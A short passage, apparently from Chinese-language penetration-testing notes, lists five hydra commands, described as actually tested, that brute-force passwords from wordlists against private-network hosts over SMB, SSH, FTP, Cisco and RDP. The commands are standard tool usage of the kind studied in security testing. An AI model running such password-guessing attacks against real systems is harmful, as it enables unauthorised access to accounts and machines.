...
实测如下：
# hydra -l administrator -P a.txt -t 10 -vV 10.148.149.253 smb

# hydra -l admin -P wordlis.txt -t 256 10.148.149.115 ssh

# hydra -l amgroup -P a.txt -t 10 -vV 10.148.149.241 ftp

# hydra -P a.txt 10.148.149.254 cisco

# hydra -l administrator -P a.txt -t 1 10.148.149.200 rdp
